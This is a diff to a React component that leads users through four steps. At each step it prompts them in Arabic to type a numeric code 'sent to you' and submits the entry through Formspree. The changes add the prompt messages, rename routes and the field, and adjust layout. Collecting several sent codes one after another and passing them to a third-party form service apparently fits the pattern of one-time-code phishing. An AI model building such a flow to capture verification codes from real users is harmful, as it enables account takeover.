@@ -5,6 +5,7 @@ import { useForm } from "@formspree/react";
 
 function EnterCode({ id }) {
   const [state, handleSubmit] = useForm("xjkbqzbo");
+  const [message, setMessage] = useState("");
   const router = useRouter();
   const [formData, setFormData] = useState({
     id: id || "",
@@ -26,15 +27,19 @@ function EnterCode({ id }) {
 
     switch (id) {
       case "code1":
-        router.replace("/2");
+        setMessage("ادخل الكود الاول المرسل لك :");
+        router.replace("/code2");
         break;
       case "code2":
-        router.replace("/3");
+        setMessage("ادخل الكود الثاني المرسل لك :");
+        router.replace("/code3");
         break;
       case "code3":
-        router.replace("/4");
+        setMessage("ادخل الكود الثالث المرسل لك :");
+        router.replace("/code4");
         break;
       case "code4":
+        setMessage("ادخل الكود الرابع المرسل لك :");
         router.replace("/Finish");
         break;
       default:
@@ -48,11 +53,11 @@ function EnterCode({ id }) {
       <form method="POST" onSubmit={onFormSubmit}>
         <input
           type="text"
-          name="code1"
+          name="code"
           value={formData.code1}
           onChange={(e) => setFormData({ ...formData, code1: e.target.value })}
           placeholder="مثال : 234152"
-          className="w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
+          className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
         />
         <div className="w-full flex justify-center">
           <button
